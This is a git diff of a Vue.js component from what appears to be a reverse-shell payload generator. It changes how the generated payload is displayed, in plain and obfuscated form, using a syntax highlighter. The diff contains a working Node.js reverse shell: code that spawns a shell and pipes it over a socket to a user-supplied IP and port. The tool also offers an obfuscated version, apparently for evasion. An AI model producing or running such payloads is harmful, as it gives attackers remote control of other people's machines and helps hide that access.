@@ -36,21 +36,17 @@
       </v-container>
 
       <v-container>
-          <v-tabs  class="mb-1" v-model="tab" background-color="transparent" color="basil" grow>
+          <v-tabs  class="mb-2" v-model="tab"  grow>
             <v-tabs-slider></v-tabs-slider>
               <v-tab :key="1" :href="`#plainJs`">Plain JS</v-tab>
               <v-tab :key="2" :href="`#obfuscedJs`">Obfusced</v-tab>
            </v-tabs>
           <v-tabs-items v-model="tab">
           <v-tab-item :key="1" value="plainJs">
-            <v-card  color="basil" flat tile>
-              <code v-html="payload" class="py-2" style="width: 100%;"></code>
-            </v-card>
+             <prism language="javascript">{{payload}}</prism>
           </v-tab-item>
           <v-tab-item :key="2" value="obfuscedJs">
-            <v-card color="basil" flat tile>
-              <code v-html="obfusced" class="py-2" style="width: 100%;"></code>
-            </v-card>
+              <prism language="javascript">{{ obfusced }}</prism>
           </v-tab-item>
           </v-tabs-items>
       </v-container>
@@ -73,6 +69,7 @@
 </template>
 
 <script>
+import Prism from 'vue-prism-component'
 import {
   required,
   ipAddress,
@@ -82,6 +79,9 @@ import {
 var JavaScriptObfuscator = require('javascript-obfuscator')
 
 export default {
+  components: {
+    Prism
+  },
   data () {
     return {
       buildingjs: false,
@@ -112,9 +112,9 @@ export default {
       (function(){
           var net = require("net"),
           child = require("child_process"),
-          shell = child.spawn("<kbd>${this.shell}</kbd>", []);
+          shell = child.spawn("${this.shell}", []);
           var client = new net.Socket();
-          client.connect(<kbd>${this.port}</kbd>, "<kbd>${this.ip}</kbd>", function(){      
+          client.connect(${this.port}, "${this.ip}", function(){      
             client.pipe(shell.stdin);
             shell.stdout.pipe(client);
             shell.stderr.pipe(client);
